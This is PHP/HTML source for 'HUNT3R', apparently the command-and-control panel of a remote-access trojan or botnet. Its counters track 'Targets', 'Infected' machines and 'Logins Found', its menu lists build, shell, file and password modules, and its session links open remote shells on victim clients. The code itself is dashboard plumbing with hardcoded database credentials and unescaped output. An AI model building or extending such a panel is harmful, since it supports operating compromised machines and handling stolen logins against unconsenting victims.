<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">   
    <title>HUNT3R | Control Panel</title>
</head>
<body>
    <div class="header">
        <div class="combined-header">
            <div class="horizontal-header">
                <div class="logo">
                    <img src="logo6.png" alt="Logo">
                </div>
                <div class="header-content">
		    <div class="online-count">
            	        <?php
			    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Targets:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
    		    <div class="online-count">
            	        <?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Infected:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        	        ?>
    		    </div>
    	            <div class="online-count">
        		<?php
        		    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients WHERE status = "Online"');
        		    $stmt->execute();
        		    $onlineCount = $stmt->fetchColumn();
        		    echo '<p><font color="white">Clients Online:</font></p>';
        		    echo '<div class="count ';
      			    if ($onlineCount == 0) {
       		  	        echo 'red';
      		     	    } elseif ($onlineCount <= 3) {
       		    		echo 'yellow';
       		  	    } else {
         	   		 echo 'green';
        	  	    }
        	 	    echo '">' . $onlineCount . '</div>';
        		?>
    		    </div>
    		    <div class="online-count">
            		<?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Active Sessions:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
		    <div class="online-count">
            		<?php
			    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
	            	    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xpwd');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Logins Found:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        	        ?>
    		    </div>
    	            <div class="online-count">
        		<?php
        		    $pdo = new PDO('mysql:host=localhost;dbname=team', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM member');
        		    $stmt->execute();
        		    $onlineCount = $stmt->fetchColumn();
        		    echo '<p><font color="white">Team Member:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $onlineCount . '</font></div>';
        		?>
    		    </div>
    		    <div class="online-count">
            		<?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM member WHERE zstatus = "online"');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Member Online:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
                </div>
                <div class="settings-button">
                    <button><img src="settings.png" alt="Settings" width="40" height="40"></button>
                </div>
		<div class="settings-button">
                    <button><img src="logout.png" alt="Logout" width="35" height="35"></button>
                </div>
            </div>
            <div class="vertical-header">
                <div class="menu">
    		    <ul>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">CONTROL</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XBUILD</span></div></a></li>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XSHELL</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XFILE</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XPASS</span></div></a></li>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XLOGS</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XTEAM</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XCHAT</span></div></a></li>
    		    </ul>
	        </div>
                <div class="tabs">
    <p><font color="#ffffff"><b>SESSION TABS:</b></font></p><br>
    <?php
    $pdo = new PDO('mysql:host=localhost;dbname=session', 'hunt3r', 'hunt3r');
    $stmt = $pdo->query('SELECT sessionname, sessionstatus, xid FROM xsession');

    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $sessionName = $row['sessionname'];
        $sessionStatus = $row['sessionstatus'];
        $xid = $row['xid'];

        if ($sessionStatus == 0) {
            $color = '#ff0000'; // Rot
        } elseif ($sessionStatus == 1) {
            $color = '#ffff00'; // Gelb
        } elseif ($sessionStatus == 2) {
            $color = '#00ff00'; // Grün
        } else {
            $color = '#ffffff'; // Standardfarbe
        }

        // Füge einen Link hinzu, um die Sitzung zu öffnen
        echo '<p class="session"><font color="' . $color . '"><b>[-] <a href="xshell.php?sid=' . $xid . '">' . $sessionName . '</a></b></font></p><br>';
    }
    ?>
</div>

            <div class="slider-container">
                <form id="profileForm">
	            <div class="timeinterval"><p><b>Time Interval:</b></p></div>
                        <div class="profile-buttons">
                            <button type="button" class="profile-button active" data-profile="Profil 1">Profile 1</button>
                            <button type="button" class="profile-button" data-profile="Profil 2">Profile 2</button>
                            <button type="button" class="profile-button" data-profile="Profil 3">Profile 3</button>
                        </div>
                    </form>
                </div>
                <div class="version">
		    <p>Version 1.0</p><br>
                    <button class="kill-switch">Kill Switch</button>
                </div>
            </div>
        </div>
    </div>
    <div class="main-content">
        <?php
            $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');

            if (isset($_POST['deleteButton']) && $_POST['deleteButton'] == 1 && isset($_POST['xid'])) {
                $xid = $_POST['xid'];

                $stmt = $pdo->prepare('DELETE FROM xclients WHERE xid = :xid');
                $stmt->bindParam(':xid', $xid);

                if ($stmt->execute()) {
                    $deleteSuccessMessage = 'Profil erfolgreich gelöscht.';
                } else {
                    $deleteErrorMessage = 'Fehler beim Löschen des Profils.';
                }
            }
        ?>

    	<div class="left-pane">
            <h2>Clients</h2>
            <table>
                <thead>
                    <tr>
                        <th>xClientID</th>
                        <th>IPv4</th>
                        <th>Nickname</th>
                        <th>Hostname</th>
                        <th>Status</th>
                        <th>Options</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                        $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');

                        $stmt = $pdo->prepare('SELECT xid, ip, nickname, hostname, status FROM xclients');
                        $stmt->execute();
                        $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

                        foreach ($clients as $client) {
                            echo '<tr class="client-row" data-xid="' . $client['xid'] . '">';
                            echo '<td>' . $client['xid'] . '</td>';
                            echo '<td>' . $client['ip'] . '</td>';
                            echo '<td>' . $client['nickname'] . '</td>';
                            echo '<td>' . $client['hostname'] . '</td>';
                            echo '<td class="status-' . strtolower($client['status']) . '">' . $client['status'] . '</td>';
                            echo '<td><form method="post" action="">'; // Kein Ziel angegeben
                            echo '<input type="hidden" name="xid" value="' . $client['xid'] . '">';
                            echo '<button type="submit" name="deleteButton" value="1">Delete</button>';
                            echo '</form></td>';
                            echo '</tr>';
                        }
                    ?>
                </tbody>
            </table>
        </div>
            <div class="right-pane">
                <h2>Client Info</h2>
                <img id="clientImage" src="" alt="Client Image">
            </div>

	<div class="popup-overlay" id="popupOverlay">
    	    <div class="popup">
        	<?php
       		    if (isset($_POST['deleteButton']) && $_POST['deleteButton'] == 1) {
                    if (isset($deleteSuccessMessage)) {
                    echo $deleteSuccessMessage;
            	    } elseif (isset($deleteErrorMessage)) {
            	    echo $deleteErrorMessage;
            	    }
            	    echo '<br><button id="closePopupButton">Close Popup</button>';
        	    }
        	?>
    	    </div>
        </div>
    </div>
<script type="text/javascript" src="script.js"></script>
<script type="text/javascript" src="xscript.js"></script>
<script type="text/javascript" src="/js/client_interval.js"></script>
</body>
</html>